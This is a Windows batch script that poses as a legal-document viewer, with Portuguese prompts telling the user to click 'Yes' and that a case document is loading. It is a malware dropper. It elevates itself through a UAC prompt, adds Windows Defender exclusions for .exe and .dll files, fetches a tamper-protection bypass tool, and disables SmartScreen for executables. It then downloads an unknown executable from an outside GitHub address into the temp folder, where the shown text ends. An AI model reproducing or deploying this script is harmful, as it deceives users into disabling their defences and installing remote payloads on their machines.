@echo off

title Sistema de Informacao
:: BatchGotAdmin
::-----------------------------------------
REM  --> CheckING for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Clique em 'Sim' para visualizar seu processo.
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""
powershell.exe -command "Add-MpPreference -ExclusionExtension ".dll""

echo  Iniciando documento processual. Aguarde..
timeout 6 /nobreak
color 0a

cd  %temp%

bitsadmin/transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe %temp%\NSudo.exe

set pop=%systemroot%

NSudo -U:T -ShowWindowMode:Hide reg add "HKEY_CURRENT_USER\Software\Classes\exefile\shell\open"  /v "NoSmartScreen" /t REG_DWORD /d "1" /f

timeout 5 /nobreak

bitsadmin/transfer Explorers /download /priority FOREGROUND https://github.com/shildren2023/down/raw/main/winproject.exe %temp%\winproject.exe


